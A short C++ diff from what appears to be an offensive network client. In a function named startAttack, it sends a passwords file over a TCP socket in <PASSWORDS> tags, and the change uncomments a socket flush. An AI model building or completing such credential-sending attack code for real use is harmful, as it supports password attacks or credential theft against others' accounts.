@@ -102,7 +102,7 @@ void ClientWindow::startAttack(){
     tcpSocket->write(passwordsFile.readAll());
     tcpSocket->waitForBytesWritten();
     tcpSocket->write("</PASSWORDS>");
-    //tcpSocket->flush();
+    tcpSocket->flush();
     loginsFile.close();
     passwordsFile.close();
 }
